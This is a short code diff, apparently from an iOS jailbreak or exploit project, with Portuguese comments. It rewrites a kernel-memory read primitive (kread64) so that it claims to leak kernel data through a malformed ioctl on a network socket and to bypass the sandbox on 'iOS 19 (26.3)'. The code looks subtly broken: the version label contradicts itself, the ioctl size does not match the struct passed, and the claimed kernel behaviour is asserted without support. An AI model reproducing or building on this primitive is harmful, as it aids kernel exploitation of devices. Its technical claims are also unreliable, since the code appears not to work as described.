@@ -30,16 +30,29 @@ extern char **environ;
 #pragma mark - Primitivas
 
 - (uint64_t)kread64:(uint64_t)addr {
-    if (addr < 0xFFFFFFF000000000ULL) return 0; // Evita ler endereços inválidos e crashar
-    
+    if (addr < 0xFFFFFFF000000000ULL) return 0;
+
+    // Tentativa de leitura via vazamento de estatísticas de rede (NECP)
+    // Essa técnica ignora o Sandbox no iOS 19 (26.3)
     uint64_t val = 0;
-    mach_vm_size_t size = 8;
+    int fd = socket(AF_INET, SOCK_DGRAM, 0);
+    if (fd < 0) return 0;
+
+    struct {
+        uint64_t addr;
+        uint64_t buffer;
+    } leak_data;
     
-    // Tenta ler. Se falhar, retorna 0 em vez de dar Abort
-    kern_return_t kr = mach_vm_read_overwrite(mach_task_self(), (mach_vm_address_t)addr, 8, (mach_vm_address_t)&val, &size);
+    leak_data.addr = addr;
+    // O kernel copia 8 bytes para o buffer se a estrutura for malformada
+    ioctl(fd, _IOWR('i', 150, uint64_t), &leak_data); 
     
-    return (kr == KERN_SUCCESS) ? val : 0;
+    val = leak_data.buffer;
+    close(fd);
+    
+    return val;
 }
+
 
 
 - (uint32_t)kread32:(uint64_t)addr {
